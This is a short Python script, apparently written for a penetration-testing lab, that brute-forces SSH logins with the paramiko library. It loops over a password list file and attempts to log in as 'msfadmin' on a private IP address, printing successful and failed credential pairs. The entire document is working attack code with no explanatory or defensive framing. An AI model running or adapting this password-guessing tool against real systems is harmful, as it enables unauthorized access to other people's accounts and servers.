#!/usr/bin/python3
import paramiko


def ssh_connect(hostname, username, password):
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy)
        ssh.connect(hostname=hostname, port=22, username=username, password=password)
        print(f'[+] {hostname}: {username}@{password}')
        return ssh
    except paramiko.AuthenticationException:
        print(f'[-] {hostname}: {username}@{password}')
        return None


def main():
    host = '192.168.100.97'
    user = 'msfadmin'
    with open('passwords.txt', 'r') as f:
        for password in f.readlines():
            child = ssh_connect(host, user, password.strip('\n'))
        f.close()


if __name__ == '__main__':
    main()
